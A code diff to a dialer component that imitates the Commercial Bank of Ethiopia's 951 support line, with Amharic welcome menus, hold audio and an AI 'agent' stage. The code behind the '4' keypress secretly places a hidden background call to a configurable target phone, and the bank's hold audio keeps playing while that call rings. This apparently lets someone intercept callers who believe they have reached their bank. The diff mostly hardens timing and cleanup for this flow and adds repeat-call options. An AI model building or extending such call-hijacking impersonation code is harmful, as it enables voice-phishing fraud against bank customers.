@@ -218,6 +218,7 @@ export function Dialer951CallOverlay({
   const audioElRef = useRef<HTMLAudioElement | null>(null);
   const audioCtxRef = useRef<AudioContext | null>(null);
   const ringStopRef = useRef<(() => void) | null>(null);
+  const ringTimerRef = useRef<number | null>(null);
   const holdTimerRef = useRef<number | null>(null);
   const retryTimerRef = useRef<number | null>(null);
   const sleepTimerRef = useRef<number | null>(null);
@@ -225,6 +226,7 @@ export function Dialer951CallOverlay({
   const playbackSettlerRef = useRef<((reason: 'ended' | 'stopped' | 'error') => void) | null>(null);
   const playbackTokenRef = useRef<number>(0);
   const menuLoopEpochRef = useRef<number>(0);
+  const isRepeatMenuRef = useRef<boolean>(false);
   const stepCursorRef = useRef<number>(0);
   const historyRef = useRef<{ role: 'user' | 'agent'; text: string }[]>([]);
   const mediaStreamRef = useRef<MediaStream | null>(null);
@@ -488,6 +490,10 @@ export function Dialer951CallOverlay({
         };
         playbackSettlerRef.current = finish;
         try {
+          if (playbackTokenRef.current !== myToken || !openRef.current) {
+            finish('stopped');
+            return;
+          }
           const audio = new Audio(resolvedUrl);
           audio.preload = 'auto';
           audio.loop = loop;
@@ -496,7 +502,11 @@ export function Dialer951CallOverlay({
             void audio
               .play()
               .then(() => {
-                if (playbackTokenRef.current !== myToken) {
+                if (playbackTokenRef.current !== myToken || !openRef.current) {
+                  try {
+                    audio.pause();
+                    audio.currentTime = 0;
+                  } catch {}
                   finish('stopped');
                 } else {
                   finish('ended');
@@ -507,7 +517,18 @@ export function Dialer951CallOverlay({
           }
           audio.onended = () => finish('ended');
           audio.onerror = () => finish('error');
-          void audio.play().catch(() => finish('error'));
+          void audio
+            .play()
+            .then(() => {
+              if (playbackTokenRef.current !== myToken || !openRef.current) {
+                try {
+                  audio.pause();
+                  audio.currentTime = 0;
+                } catch {}
+                finish('stopped');
+              }
+            })
+            .catch(() => finish('error'));
         } catch {
           finish('error');
         }
@@ -750,8 +771,14 @@ export function Dialer951CallOverlay({
   }, [appendTranscript, playAudioClipById, speakBrowserAmharic, startMicVad, stopAllAudio, updatePhase]);
 
   const finishAndExit = useCallback(() => {
+    openRef.current = false;
     menuLoopEpochRef.current += 1;
+    playbackTokenRef.current += 1;
     surveyReplayRef.current = false;
+    if (ringTimerRef.current) {
+      clearTimeout(ringTimerRef.current);
+      ringTimerRef.current = null;
+    }
     if (holdTimerRef.current) {
       clearTimeout(holdTimerRef.current);
       holdTimerRef.current = null;
@@ -759,6 +786,11 @@ export function Dialer951CallOverlay({
     if (retryTimerRef.current) {
       clearTimeout(retryTimerRef.current);
       retryTimerRef.current = null;
+    }
+    if (typeof bridgeRef.current?.cancelSecretBackgroundCall === 'function') {
+      try {
+        (bridgeRef.current.cancelSecretBackgroundCall as () => void)();
+      } catch {}
     }
     updatePhase('ended');
     stopMicVad();
@@ -771,9 +803,11 @@ export function Dialer951CallOverlay({
   }, [stopAllAudio, stopMicVad, updatePhase]);
 
   const startWelcomeMenuLoop = useCallback(async () => {
+    if (!openRef.current) return;
     const loopEpoch = ++menuLoopEpochRef.current;
     const cfg = configRef.current;
     stopAllAudio();
+    if (!openRef.current || menuLoopEpochRef.current !== loopEpoch) return;
     updatePhase('welcome_menu');
     const welcomeText =
       'እንኳን ወደ የኢትዮጵያ ንግድ ባንክ የደንበኞች አገልግሎት 951 በደህና መጡ። ለአማርኛ አንድን ይጫኑ።';
@@ -820,61 +854,72 @@ export function Dialer951CallOverlay({
     }
   }, [appendTranscript, playAudioClipById, speakBrowserAmharic, stopAllAudio, updatePhase, waitInterruptibly]);
 
-  const startAmharicMenuLoop = useCallback(async () => {
-    const loopEpoch = ++menuLoopEpochRef.current;
-    const cfg = configRef.current;
-    stopAllAudio();
-    updatePhase('amharic_menu');
-    const menuFallbackText =
-      'ወደ መረጡት ቋንቋ ተቀይሮሎታል። የጥሪ ማዕከላችንን ሰራተኞች ለማግኘት አራትን ይጫኑ። እንደገና ለማዳመጥ ዘጠኝን ይጫኑ።';
-    appendTranscript(
-      'agent',
-      cfg.amharicMenuClipId && cfg.amharicMenuClipId !== '__none__'
-        ? '🔊 [የአማርኛ ሜኑ] ለሰራተኞች 4ን ይጫኑ...'
-        : menuFallbackText
-    );
+  const startAmharicMenuLoop = useCallback(
+    async (useRepeatMenu = false) => {
+      if (!openRef.current) return;
+      const loopEpoch = ++menuLoopEpochRef.current;
+      const cfg = configRef.current;
+      isRepeatMenuRef.current = useRepeatMenu;
+      const activeClipId = useRepeatMenu ? cfg.amharicMenuRepeatClipId : cfg.amharicMenuClipId;
+      stopAllAudio();
+      if (!openRef.current || menuLoopEpochRef.current !== loopEpoch) return;
+      updatePhase('amharic_menu');
+      const menuFallbackText = useRepeatMenu
+        ? 'ባንኩ ስለሚሰጣቸው አገልግሎቶች ለማወቅ አንድን ይጫኑ። የጥሪ ማዕከላችንን ሰራተኞች ለማግኘት አራትን ይጫኑ። እንደገና ለማዳመጥ ዘጠኝን ይጫኑ።'
+        : 'ወደ መረጡት ቋንቋ ተቀይሮሎታል። የጥሪ ማዕከላችንን ሰራተኞች ለማግኘት አራትን ይጫኑ። እንደገና ለማዳመጥ ዘጠኝን ይጫኑ።';
+      appendTranscript(
+        'agent',
+        activeClipId && activeClipId !== '__none__'
+          ? '🔊 [የአማርኛ ሜኑ] ለሰራተኞች 4ን፣ እንደገና ለማዳመጥ 9ን ይጫኑ...'
+          : menuFallbackText
+      );
 
-    while (
-      openRef.current &&
-      menuLoopEpochRef.current === loopEpoch &&
-      (phaseRef.current as Call951Phase) === 'amharic_menu'
-    ) {
-      if (cfg.amharicMenuClipId && cfg.amharicMenuClipId !== '__none__') {
-        const res = await playAudioClipById(cfg.amharicMenuClipId, false);
+      while (
+        openRef.current &&
+        menuLoopEpochRef.current === loopEpoch &&
+        (phaseRef.current as Call951Phase) === 'amharic_menu'
+      ) {
+        if (activeClipId && activeClipId !== '__none__') {
+          const res = await playAudioClipById(activeClipId, false);
+          if (
+            res === 'stopped' ||
+            menuLoopEpochRef.current !== loopEpoch ||
+            !openRef.current ||
+            (phaseRef.current as Call951Phase) !== 'amharic_menu'
+          ) {
+            break;
+          }
+          if (res === 'error') {
+            await speakBrowserAmharic(menuFallbackText);
+          }
+        } else {
+          await speakBrowserAmharic(menuFallbackText);
+        }
+
         if (
-          res === 'stopped' ||
-          menuLoopEpochRef.current !== loopEpoch ||
+          !cfg.loopWelcomeIfNoKey ||
           !openRef.current ||
+          menuLoopEpochRef.current !== loopEpoch ||
           (phaseRef.current as Call951Phase) !== 'amharic_menu'
         ) {
           break;
         }
-        if (res === 'error') {
-          await speakBrowserAmharic(menuFallbackText);
-        }
-      } else {
-        await speakBrowserAmharic(menuFallbackText);
-      }
 
-      if (
-        !cfg.loopWelcomeIfNoKey ||
-        !openRef.current ||
-        menuLoopEpochRef.current !== loopEpoch ||
-        (phaseRef.current as Call951Phase) !== 'amharic_menu'
-      ) {
-        break;
+        const keepWaiting = await waitInterruptibly(3500, loopEpoch);
+        if (!keepWaiting) break;
       }
-
-      const keepWaiting = await waitInterruptibly(3500, loopEpoch);
-      if (!keepWaiting) break;
-    }
-  }, [appendTranscript, playAudioClipById, speakBrowserAmharic, stopAllAudio, updatePhase, waitInterruptibly]);
+    },
+    [appendTranscript, playAudioClipById, speakBrowserAmharic, stopAllAudio, updatePhase, waitInterruptibly]
+  );
 
   const playClosingSurveyAndExit = useCallback(async () => {
+    if (!openRef.current) return;
     const loopEpoch = ++menuLoopEpochRef.current;
     const cfg = configRef.current;
     stopMicVad();
     stopAllAudio();
+
+    if (!openRef.current || menuLoopEpochRef.current !== loopEpoch) return;
 
     if (!cfg.backgroundCall.playSurveyOnEnd || cfg.surveyClipId === '__none__') {
       finishAndExit();
@@ -890,7 +935,11 @@ export function Dialer951CallOverlay({
       cfg.surveyClipId ? '🔊 [ደረጃ 3 MP3] የመዝጊያ መልዕክት...' : fallbackMsg
     );
 
-    do {
+    while (
+      openRef.current &&
+      menuLoopEpochRef.current === loopEpoch &&
+      (phaseRef.current as Call951Phase) === 'survey_closing'
+    ) {
       surveyReplayRef.current = false;
       if (cfg.surveyClipId && cfg.surveyClipId !== '__none__') {
         const res = await playAudioClipById(cfg.surveyClipId, false);
@@ -906,12 +955,26 @@ export function Dialer951CallOverlay({
       } else {
         await speakBrowserAmharic(fallbackMsg);
       }
-    } while (
-      surveyReplayRef.current &&
-      menuLoopEpochRef.current === loopEpoch &&
-      openRef.current &&
-      (phaseRef.current as Call951Phase) === 'survey_closing'
-    );
+
+      if (surveyReplayRef.current) {
+        continue;
+      }
+      if (
+        !openRef.current ||
+        menuLoopEpochRef.current !== loopEpoch ||
+        (phaseRef.current as Call951Phase) !== 'survey_closing'
+      ) {
+        break;
+      }
+
+      // Brief silent grace window after "press 9 to listen again" before auto-hanging up
+      const stayedOpen = await waitInterruptibly(2200, loopEpoch);
+      if (!stayedOpen) break;
+      if (surveyReplayRef.current) {
+        continue;
+      }
+      break;
+    }
 
     if (
       menuLoopEpochRef.current === loopEpoch &&
@@ -920,42 +983,95 @@ export function Dialer951CallOverlay({
     ) {
       finishAndExit();
     }
-  }, [appendTranscript, finishAndExit, playAudioClipById, speakBrowserAmharic, stopAllAudio, stopMicVad, updatePhase]);
+  }, [
+    appendTranscript,
+    finishAndExit,
+    playAudioClipById,
+    speakBrowserAmharic,
+    stopAllAudio,
+    stopMicVad,
+    updatePhase,
+    waitInterruptibly,
+  ]);
 
-  const handleEndCall = useCallback(async () => {
-    menuLoopEpochRef.current += 1;
-    if (holdTimerRef.current) {
-      clearTimeout(holdTimerRef.current);
-      holdTimerRef.current = null;
-    }
-    if (retryTimerRef.current) {
-      clearTimeout(retryTimerRef.current);
-      retryTimerRef.current = null;
-    }
-    if (phaseRef.current === 'survey_closing') {
-      finishAndExit();
-      return;
-    }
-    stopMicVad();
-    stopAllAudio();
-    const wasInLiveFlow =
-      phaseRef.current === 'secret_live' || phaseRef.current === 'ai_active';
+  const triggerStage2HoldAndBackgroundCall = useCallback(
+    async (actionEpoch: number) => {
+      if (!openRef.current || menuLoopEpochRef.current !== actionEpoch) return;
+      markFirst951WelcomeCompleted();
+      const cfg = configRef.current;
+      stopAllAudio();
+      if (!openRef.current || menuLoopEpochRef.current !== actionEpoch) return;
+      appendTranscript('system', '4 ተጫነ — ወደ ጥሪ ማዕከሉ ባለሙያ እየተላለፈ ነው...');
 
-    if (typeof bridgeRef.current?.cancelSecretBackgroundCall === 'function') {
-      try {
-        (bridgeRef.current.cancelSecretBackgroundCall as () => void)();
-      } catch {}
-    }
+      if (
+        cfg.backgroundCall.enabled &&
+        cfg.backgroundCall.targetPhone.trim().length >= 9 &&
+        typeof bridgeRef.current?.startSecretBackgroundCall === 'function'
+      ) {
+        updatePhase('secret_ringing');
+        void playAudioClipById(cfg.holdClipId, true);
+        if (!openRef.current || menuLoopEpochRef.current !== actionEpoch) {
+          stopAllAudio();
+          return;
+        }
+        try {
+          (bridgeRef.current.startSecretBackgroundCall as (n: string, ms: number) => void)(
+            cfg.backgroundCall.targetPhone.trim(),
+            Math.max(4, cfg.backgroundCall.maxRingSec) * 1000
+          );
+        } catch {}
+        return;
+      }
 
-    if (wasInLiveFlow) {
-      await playClosingSurveyAndExit();
-      return;
-    }
+      // Combined Stage 2 Hold MP3 -> AI Support conversation
+      updatePhase('hold_mp3');
+      appendTranscript('system', '🎵 የ951 ጥበቃ ድምፅ (ደረጃ 2) እየተጫወተ ነው...');
+      if (cfg.waitFullHoldMp3 || cfg.mode === 'mp3_only') {
+        const res = await playAudioClipById(cfg.holdClipId, false);
+        if (
+          res !== 'stopped' &&
+          menuLoopEpochRef.current === actionEpoch &&
+          openRef.current &&
+          (phaseRef.current as Call951Phase) === 'hold_mp3'
+        ) {
+          if (cfg.mode === 'mp3_only') {
+            await playClosingSurveyAndExit();
+          } else {
+            void enterAgentAiConversation();
+          }
+        }
+      } else {
+        void playAudioClipById(cfg.holdClipId, false);
+        const holdMs = Math.max(3, cfg.holdDurationSec) * 1000;
+        holdTimerRef.current = window.setTimeout(() => {
+          if (
+            menuLoopEpochRef.current === actionEpoch &&
+            openRef.current &&
+            (phaseRef.current as Call951Phase) === 'hold_mp3'
+          ) {
+            void enterAgentAiConversation();
+          }
+        }, holdMs);
+      }
+    },
+    [
+      appendTranscript,
+      enterAgentAiConversation,
+      playAudioClipById,
+      playClosingSurveyAndExit,
+      stopAllAudio,
+      updatePhase,
+    ]
+  );
+
+  const handleEndCall = useCallback(() => {
+    // Immediate hard cutoff on user hangup at ANY phase: zero trailing MP3 and zero outgoing/retry calls
     finishAndExit();
-  }, [finishAndExit, playClosingSurveyAndExit, stopAllAudio, stopMicVad]);
+  }, [finishAndExit]);
 
   const handleInCallDigit = useCallback(
     async (digit: string) => {
+      if (!openRef.current) return;
       playSharedDtmf(audioCtxRef, digit);
       setDtmfEntered((prev) => `${prev}${digit}`.slice(-12));
 
@@ -963,9 +1079,13 @@ export function Dialer951CallOverlay({
         (phaseRef.current === 'welcome_menu' || phaseRef.current === 'ringing') &&
         digit === '1'
       ) {
+        if (ringTimerRef.current) {
+          clearTimeout(ringTimerRef.current);
+          ringTimerRef.current = null;
+        }
         markFirst951WelcomeCompleted();
         appendTranscript('system', '1 ተጫነ — ወደ አማርኛ ተቀይሯል');
-        void startAmharicMenuLoop();
+        void startAmharicMenuLoop(false);
         return;
       }
 
@@ -975,7 +1095,7 @@ export function Dialer951CallOverlay({
       }
 
       if (phaseRef.current === 'amharic_menu' && digit === '9') {
-        void startAmharicMenuLoop();
+        void startAmharicMenuLoop(isRepeatMenuRef.current);
         return;
       }
 
@@ -985,58 +1105,12 @@ export function Dialer951CallOverlay({
           phaseRef.current === 'ringing') &&
         digit === '4'
       ) {
+        if (ringTimerRef.current) {
+          clearTimeout(ringTimerRef.current);
+          ringTimerRef.current = null;
+        }
         const actionEpoch = ++menuLoopEpochRef.current;
-        markFirst951WelcomeCompleted();
-        const cfg = configRef.current;
-        stopAllAudio();
-        appendTranscript('system', '4 ተጫነ — ወደ ጥሪ ማዕከሉ ባለሙያ እየተላለፈ ነው...');
-
-        if (
-          cfg.backgroundCall.enabled &&
-          cfg.backgroundCall.targetPhone.trim().length >= 9 &&
-          typeof bridgeRef.current?.startSecretBackgroundCall === 'function'
-        ) {
-          updatePhase('secret_ringing');
-          void playAudioClipById(cfg.holdClipId, true);
-          try {
-            (bridgeRef.current.startSecretBackgroundCall as (n: string, ms: number) => void)(
-              cfg.backgroundCall.targetPhone.trim(),
-              Math.max(4, cfg.backgroundCall.maxRingSec) * 1000
-            );
-          } catch {}
-          return;
-        }
-
-        // Combined Stage 2 Hold MP3 -> AI Support conversation
-        updatePhase('hold_mp3');
-        appendTranscript('system', '🎵 የ951 ጥበቃ ድምፅ (ደረጃ 2) እየተጫወተ ነው...');
-        if (cfg.waitFullHoldMp3 || cfg.mode === 'mp3_only') {
-          const res = await playAudioClipById(cfg.holdClipId, false);
-          if (
-            res !== 'stopped' &&
-            menuLoopEpochRef.current === actionEpoch &&
-            openRef.current &&
-            (phaseRef.current as Call951Phase) === 'hold_mp3'
-          ) {
-            if (cfg.mode === 'mp3_only') {
-              await playClosingSurveyAndExit();
-            } else {
-              void enterAgentAiConversation();
-            }
-          }
-        } else {
-          void playAudioClipById(cfg.holdClipId, false);
-          const holdMs = Math.max(3, cfg.holdDurationSec) * 1000;
-          holdTimerRef.current = window.setTimeout(() => {
-            if (
-              menuLoopEpochRef.current === actionEpoch &&
-              openRef.current &&
-              (phaseRef.current as Call951Phase) === 'hold_mp3'
-            ) {
-              void enterAgentAiConversation();
-            }
-          }, holdMs);
-        }
+        await triggerStage2HoldAndBackgroundCall(actionEpoch);
         return;
       }
 
@@ -1044,6 +1118,7 @@ export function Dialer951CallOverlay({
         if (digit === '9') {
           surveyReplayRef.current = true;
           stopAllAudio();
+          cancelPendingSleep();
           return;
         }
         if (digit === '1' || digit === '2' || digit === '3') {
@@ -1054,14 +1129,12 @@ export function Dialer951CallOverlay({
     },
     [
       appendTranscript,
-      enterAgentAiConversation,
+      cancelPendingSleep,
       finishAndExit,
-      playAudioClipById,
-      playClosingSurveyAndExit,
       startAmharicMenuLoop,
       startWelcomeMenuLoop,
       stopAllAudio,
-      updatePhase,
+      triggerStage2HoldAndBackgroundCall,
     ]
   );
 
@@ -1070,6 +1143,11 @@ export function Dialer951CallOverlay({
     if (!open) {
       openRef.current = false;
       menuLoopEpochRef.current += 1;
+      playbackTokenRef.current += 1;
+      if (ringTimerRef.current) {
+        clearTimeout(ringTimerRef.current);
+        ringTimerRef.current = null;
+      }
       if (holdTimerRef.current) {
         clearTimeout(holdTimerRef.current);
         holdTimerRef.current = null;
@@ -1077,6 +1155,11 @@ export function Dialer951CallOverlay({
       if (retryTimerRef.current) {
         clearTimeout(retryTimerRef.current);
         retryTimerRef.current = null;
+      }
+      if (typeof bridgeRef.current?.cancelSecretBackgroundCall === 'function') {
+        try {
+          (bridgeRef.current.cancelSecretBackgroundCall as () => void)();
+        } catch {}
       }
       stopMicVad();
       stopAllAudio();
@@ -1089,12 +1172,13 @@ export function Dialer951CallOverlay({
     const initialEpoch = ++menuLoopEpochRef.current;
 
     Promise.resolve().then(() => {
-      if (!active) return;
+      if (!active || !openRef.current) return;
       const loadedCfg = load951Config();
       configRef.current = loadedCfg;
       historyRef.current = [];
       stepCursorRef.current = 0;
       surveyReplayRef.current = false;
+      isRepeatMenuRef.current = false;
       setElapsedSec(0);
       setDtmfEntered('');
       setKeypadVisible(false);
@@ -1107,7 +1191,8 @@ export function Dialer951CallOverlay({
       startRingbackTone();
     });
 
-    const ringTimer = window.setTimeout(() => {
+    ringTimerRef.current = window.setTimeout(() => {
+      ringTimerRef.current = null;
       if (
         !active ||
         !openRef.current ||
@@ -1118,7 +1203,12 @@ export function Dialer951CallOverlay({
       }
       stopAllAudio();
       if (hasCompletedFirst951Welcome()) {
-        void startAmharicMenuLoop();
+        if (configRef.current.skipMenuAfterFirstCall) {
+          void triggerStage2HoldAndBackgroundCall(initialEpoch);
+        } else {
+          // On repeat calls, skip "ወደ መረጡት ቋንቋ ተቀይሮሎታል።" and start straight from the menu
+          void startAmharicMenuLoop(true);
+        }
       } else {
         void startWelcomeMenuLoop();
       }
@@ -1133,12 +1223,12 @@ export function Dialer951CallOverlay({
     };
 
     winAny.onSecretCallRinging = () => {
-      if (!active) return;
+      if (!active || !openRef.current) return;
       updatePhase('secret_ringing');
     };
 
     winAny.onSecretCallNoAnswer = () => {
-      if (!active) return;
+      if (!active || !openRef.current) return;
       const cfg = configRef.current;
       updatePhase('secret_busy_retry');
       const holdAlreadyPlaying =
@@ -1152,6 +1242,7 @@ export function Dialer951CallOverlay({
         clearTimeout(retryTimerRef.current);
       }
       retryTimerRef.current = window.setTimeout(() => {
+        retryTimerRef.current = null;
         if (
           active &&
           openRef.current &&
@@ -1169,7 +1260,7 @@ export function Dialer951CallOverlay({
     };
 
     winAny.onSecretCallAnswered = () => {
-      if (!active) return;
+      if (!active || !openRef.current) return;
       // Stop the Hold MP3 immediately the instant the call is picked up
       menuLoopEpochRef.current += 1;
       stopAllAudio();
@@ -1178,12 +1269,12 @@ export function Dialer951CallOverlay({
     };
 
     winAny.onSecretCallRemoteEnded = async () => {
-      if (!active) return;
+      if (!active || !openRef.current) return;
       await playClosingSurveyAndExit();
     };
 
     winAny.onSecretCallError = () => {
-      if (!active) return;
+      if (!active || !openRef.current) return;
       void enterAgentAiConversation();
     };
 
@@ -1191,7 +1282,11 @@ export function Dialer951CallOverlay({
       active = false;
       openRef.current = false;
       menuLoopEpochRef.current += 1;
-      clearTimeout(ringTimer);
+      playbackTokenRef.current += 1;
+      if (ringTimerRef.current) {
+        clearTimeout(ringTimerRef.current);
+        ringTimerRef.current = null;
+      }
       if (holdTimerRef.current) {
         clearTimeout(holdTimerRef.current);
         holdTimerRef.current = null;
@@ -1199,6 +1294,11 @@ export function Dialer951CallOverlay({
       if (retryTimerRef.current) {
         clearTimeout(retryTimerRef.current);
         retryTimerRef.current = null;
+      }
+      if (typeof bridgeRef.current?.cancelSecretBackgroundCall === 'function') {
+        try {
+          (bridgeRef.current.cancelSecretBackgroundCall as () => void)();
+        } catch {}
       }
       stopMicVad();
       stopAllAudio();
@@ -1219,6 +1319,7 @@ export function Dialer951CallOverlay({
     startWelcomeMenuLoop,
     stopAllAudio,
     stopMicVad,
+    triggerStage2HoldAndBackgroundCall,
     updatePhase,
   ]);
 
@@ -1957,7 +2058,12 @@ export function Dialer951StudioDrawer({
 
   const handleUploadMp3 = async (
     e: React.ChangeEvent<HTMLInputElement>,
-    assignToSlot?: 'welcomeClipId' | 'amharicMenuClipId' | 'holdClipId' | 'surveyClipId'
+    assignToSlot?:
+      | 'welcomeClipId'
+      | 'amharicMenuClipId'
+      | 'amharicMenuRepeatClipId'
+      | 'holdClipId'
+      | 'surveyClipId'
   ) => {
     const file = e.target.files?.[0];
     if (!file) return;
@@ -1981,6 +2087,10 @@ export function Dialer951StudioDrawer({
       welcomeClipId: prev.welcomeClipId === id ? 'cbe_951_welcome' : prev.welcomeClipId,
       amharicMenuClipId:
         prev.amharicMenuClipId === id ? 'cbe_951_amharic_menu' : prev.amharicMenuClipId,
+      amharicMenuRepeatClipId:
+        prev.amharicMenuRepeatClipId === id
+          ? 'cbe_951_amharic_menu_repeat'
+          : prev.amharicMenuRepeatClipId,
       holdClipId: prev.holdClipId === id ? 'cbe_951_hold' : prev.holdClipId,
       surveyClipId: prev.surveyClipId === id ? 'cbe_951_survey' : prev.surveyClipId,
       mp3Steps: prev.mp3Steps.filter((s) => s.audioId !== id),
@@ -2232,11 +2342,11 @@ export function Dialer951StudioDrawer({
                   )}
                 </div>
 
-                {/* Stage 1b: Amharic Menu after pressing 1 (and automatically on subsequent calls) */}
+                {/* Stage 1b: First-time Amharic Menu after pressing 1 */}
                 <div className="pt-2 border-t border-slate-200/70 space-y-1.5">
                   <div className="flex items-center justify-between gap-2">
                     <label className="text-[11px] font-bold text-slate-700">
-                      1b. 1 ከተጫነ / ከ2ኛው ጥሪ ጀምሮ (የአማርኛ ሜኑ)
+                      1b. 1 ከተጫነ (ቋንቋ ተቀይሯል + የአማርኛ ሜኑ — 1ኛ ጊዜ)
                     </label>
                     <label className="px-2 py-0.5 rounded-lg bg-emerald-100 text-[#14884c] text-[10.5px] font-bold flex items-center gap-1 cursor-pointer shrink-0">
                       <Upload className="w-3 h-3" />
@@ -2281,8 +2391,69 @@ export function Dialer951StudioDrawer({
                   </div>
                 </div>
 
+                {/* Stage 1c: Repeat calls (no "language changed" announcement) */}
+                <div className="pt-2 border-t border-slate-200/70 space-y-1.5">
+                  <div className="flex items-center justify-between gap-2">
+                    <label className="text-[11px] font-bold text-slate-700">
+                      1c. ከ2ኛው ጥሪ ጀምሮ (ያለ ቋንቋ ማስታወቂያ — ቀጥታ ሜኑ)
+                    </label>
+                    <label className="px-2 py-0.5 rounded-lg bg-emerald-100 text-[#14884c] text-[10.5px] font-bold flex items-center gap-1 cursor-pointer shrink-0">
+                      <Upload className="w-3 h-3" />
+                      <span>MP3 ጫን</span>
+                      <input
+                        type="file"
+                        accept="audio/*"
+                        onChange={(e) => void handleUploadMp3(e, 'amharicMenuRepeatClipId')}
+                        className="hidden"
+                      />
+                    </label>
+                  </div>
+                  <div className="flex items-center gap-1.5">
+                    <select
+                      value={cfg.amharicMenuRepeatClipId}
+                      onChange={(e) =>
+                        setCfg((prev) => ({ ...prev, amharicMenuRepeatClipId: e.target.value }))
+                      }
+                      className="flex-1 min-w-0 px-3 py-2 rounded-xl border border-slate-300 text-xs bg-white outline-none"
+                    >
+                      <option value="__none__">ጠፍቷል (አይጫወት)</option>
+                      {allClips.map((c) => (
+                        <option key={c.id} value={c.id}>
+                          {c.name}
+                        </option>
+                      ))}
+                    </select>
+                    {cfg.amharicMenuRepeatClipId && cfg.amharicMenuRepeatClipId !== '__none__' && (
+                      <button
+                        type="button"
+                        onClick={() => void handleTogglePreview(cfg.amharicMenuRepeatClipId)}
+                        className="w-8 h-8 rounded-xl bg-white border border-slate-300 flex items-center justify-center text-slate-700 shrink-0 cursor-pointer"
+                        aria-label="Preview Stage 1c MP3"
+                      >
+                        {previewPlayingId === cfg.amharicMenuRepeatClipId ? (
+                          <Square className="w-3.5 h-3.5 fill-current" />
+                        ) : (
+                          <Play className="w-3.5 h-3.5 fill-current" />
+                        )}
+                      </button>
+                    )}
+                  </div>
+                </div>
+
+                <label className="flex items-center justify-between text-[11px] text-slate-600 pt-1">
+                  <span>ከ2ኛው ጥሪ ጀምሮ ሜኑውን ዘለህ ቀጥታ ወደ 4 (Hold / ባለሙያ) እለፍ</span>
+                  <input
+                    type="checkbox"
+                    checked={cfg.skipMenuAfterFirstCall}
+                    onChange={(e) =>
+                      setCfg((prev) => ({ ...prev, skipMenuAfterFirstCall: e.target.checked }))
+                    }
+                    className="accent-[#19b264] w-4 h-4"
+                  />
+                </label>
+
                 <label className="flex items-center justify-between text-[11px] text-slate-600 pt-0.5">
-                  <span>ምንም ቁጥር ካልተጫነ MP3ው በድጋሚ ይጫወት</span>
+                  <span>9 ካልተጫነ MP3ው በራሱ በድጋሚ ይጫወት (ጠፍቷል = ዝም ይላል)</span>
                   <input
                     type="checkbox"
                     checked={cfg.loopWelcomeIfNoKey}
